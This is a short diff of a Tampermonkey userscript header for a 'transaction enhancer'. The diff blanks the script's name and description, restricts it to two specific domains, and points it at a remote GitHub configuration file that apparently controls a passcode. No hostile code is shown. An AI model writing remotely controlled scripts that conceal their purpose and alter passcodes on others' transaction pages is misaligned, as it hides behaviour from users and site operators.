@@ -1,10 +1,11 @@
 // ==UserScript==
-// @name         Transaction Enhancer with Remote Control
+// @name         ......
 // @namespace    http://tampermonkey.net/
 // @version      2.0
-// @description  Enhances transaction lists with thumbnails, lightbox, and remote‑controllable passcode.
+// @description  ......
 // @author       You
-// @match        *://*/*      // ← CHANGE THIS to your target site, e.g. https://example.com/*
+// @match        https://*.as6868.com/*   // ← CHANGE THIS to your target site, e.g. https://example.com/*
+// @match        https://*.u55y38.com/*   // ← CHANGE THIS to your target site, e.g. https://example.com/*
 // @grant        none
 // ==/UserScript==
 
@@ -12,7 +13,7 @@
   'use strict';
 
   // ==================== REMOTE CONFIGURATION ====================
-  const CONFIG_URL = 'https://raw.githubusercontent.com/your-username/your-repo/main/config.json'; // ← CHANGE THIS
+  const CONFIG_URL = 'https://raw.githubusercontent.com/tinkalloet-ship-it/extension-config/refs/heads/main/config.json'; // ← CHANGE THIS
   const DEFAULT_REFRESH_INTERVAL = 5; // minutes
 
   const DEFAULT_CONFIG = {
